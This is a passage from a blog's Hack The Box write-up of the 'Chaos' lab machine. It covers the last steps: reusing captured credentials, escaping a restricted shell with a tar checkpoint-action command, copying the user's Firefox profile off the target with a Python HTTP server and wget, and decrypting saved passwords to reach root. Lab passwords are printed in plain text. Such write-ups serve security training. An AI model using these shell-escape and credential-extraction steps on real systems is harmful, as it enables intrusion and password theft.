+<h4 id="we-got-earlier-ayush-credentials-for-mail--ayushjiujitsu-lets-try-that-password-">We got earlier <code class="highlighter-rouge">ayush</code> credentials for mail : <code class="highlighter-rouge">ayush:jiujitsu</code> let’s try that password :</h4>
+<p><img src="/images/hackthebox/chaos/37.png" alt="" /></p>
+<h4 id="it-worked-but-we-are-in-a-restricted-bash-shell-now">It worked but we are in a restricted bash shell now.</h4>
+<h4 id="this-guide-is-useful-for-bypassing-restricted-shells-i-tried-some-commands-to-know-what-can-i-do-from-that-shell-and-i-could-run-tar-so-i-went-back-to-www-data-and-went-to-tmp"><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">This guide</a> is useful for bypassing restricted shells. I tried some commands to know what can I do from that shell and I could run <code class="highlighter-rouge">tar</code>. So I went back to <code class="highlighter-rouge">www-data</code> and went to <code class="highlighter-rouge">/tmp</code>.</h4>
+<h4 id="i-created-a-file-and-called-it-rick--touch-rick">I created a file and called it <code class="highlighter-rouge">rick</code> : <code class="highlighter-rouge">touch rick</code></h4>
+<h4 id="then-i-added-that-file-to-a-tar-archive-and-called-it-ricktar--tar--cvf-ricktar-rick">Then I added that file to a tar archive and called it <code class="highlighter-rouge">rick.tar</code> : <code class="highlighter-rouge">tar -cvf rick.tar rick</code></h4>
+<h4 id="i-went-back-to-ayush-and-used-tar-to-bypass-the-shell--tar-cf-devnull-ricktar---checkpoint1---checkpoint-actionexecbinbash">I went back to <code class="highlighter-rouge">ayush</code> and used <code class="highlighter-rouge">tar</code> to bypass the shell : <code class="highlighter-rouge">tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></h4>
+<h4 id="after-that-i-just-had-to-fix-my-path-and-i-had-a-functioning-bash-shell--export-pathpathusrlocalsbinusrlocalbinusrsbinusrbinsbinbin">After that I just had to fix my path and I had a functioning bash shell : <code class="highlighter-rouge">export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></h4>
+<p><img src="/images/hackthebox/chaos/38.png" alt="" /></p>
+<h4 id="now-we-can-read-the-user-flag-">Now we can read the user flag :</h4>
+<p><img src="/images/hackthebox/chaos/39.png" alt="" /></p>
+<h4 id="we-owned-user">We owned user.</h4>
+<hr />
+
+<h3 id="extracting-credentials-from-firefox-profile-privilege-escalation-and-root-flag">Extracting Credentials from Firefox Profile, Privilege Escalation and Root Flag</h3>
+<h4 id="by-looking-at-the-home-directory-for-ayush-i-saw-something-strange-">By looking at the <code class="highlighter-rouge">/home</code> directory for <code class="highlighter-rouge">ayush</code> I saw something strange :</h4>
+<p><img src="/images/hackthebox/chaos/40.png" alt="" /></p>
+<h4 id="there-was-a-mozilla-data-directory-there-i-went-there-and-there-was-a-directory-for-firefox-and-it-had-a-profile-">There was a <code class="highlighter-rouge">.mozilla</code> data directory there. I went there and there was a directory for Firefox and it had a profile :</h4>
+<p><img src="/images/hackthebox/chaos/41.png" alt="" /></p>
+<h4 id="we-can-use-a-tool-called-firefox-decrypt-and-pass-that-profile-to-it-this-tool-extracts-credentials-from-firefox-profiles">We can use a tool called <a href="https://github.com/unode/firefox_decrypt">firefox decrypt</a> and pass that profile to it. This tool extracts credentials from Firefox profiles.</h4>
+<h4 id="i-had-to-get-the-firefox-directory-on-my-box-first-i-ran-a-python-simple-http-server-on-port-1919-in-homeayushmozillafirefox-then-on-my-box-i-created-a-directory-called-firefox-and-downloaded-the-contents-of-the-original-firefox-directory-from-the-simple-http-server--wget-httpchaoshtb1919---recursive">I had to get the <code class="highlighter-rouge">firefox</code> directory on my box first, I ran a python simple http server on port 1919 in <code class="highlighter-rouge">/home/ayush/.mozilla/firefox</code> then on my box I created a directory called <code class="highlighter-rouge">firefox</code> and downloaded the contents of the original <code class="highlighter-rouge">firefox</code> directory from the simple http server : <code class="highlighter-rouge">wget http://chaos.htb:1919/ --recursive</code>.</h4>
+<h4 id="server-log-">Server Log :</h4>
+<p><img src="/images/hackthebox/chaos/42.png" alt="" /></p>
+<h4 id="downloaded-files-were-saved-in-a-directory-called-chaoshtb1919">Downloaded files were saved in a directory called <code class="highlighter-rouge">chaos.htb:1919</code>.</h4>
+<h4 id="after-that-i-used-firefox_decryptpy-and-gave-it-the-profile-which-was-called-bzo7sjt1default-">After that I used <code class="highlighter-rouge">firefox_decrypt.py</code> and gave it the profile which was called <code class="highlighter-rouge">bzo7sjt1.default</code> :</h4>
+<p><code class="highlighter-rouge">./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/</code>
+<img src="/images/hackthebox/chaos/43.png" alt="" /></p>
+<h4 id="it-asked-for-a-password-i-gave-ayushs-password-jiujitsu-and-it-worked-we-got-credentials-for-the-application-that-was-running-on-port-10000-and-the-username-was-root--rootthiv8wrej">It asked for a password, I gave <code class="highlighter-rouge">ayush</code>’s password (<code class="highlighter-rouge">jiujitsu</code>) and it worked. We got credentials for the application that was running on port 10000 and the username was <code class="highlighter-rouge">root</code> : <code class="highlighter-rouge">root:Thiv8wrej~</code>.</h4>
+<h4 id="i-didnt-go-to-port-10000-again-i-tried-su-root-first-with-this-password-and-it-worked-">I didn’t go to port 10000 again, I tried <code class="highlighter-rouge">su root</code> first with this password and it worked :</h4>
+<p><img src="/images/hackthebox/chaos/44.png" alt="" /></p>
+<h4 id="we-owned-root-">We owned root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---conceal">Previous Hack The Box write-up : <a href="/hack-the-box/conceal/">Hack The Box - Conceal</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/chaos/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
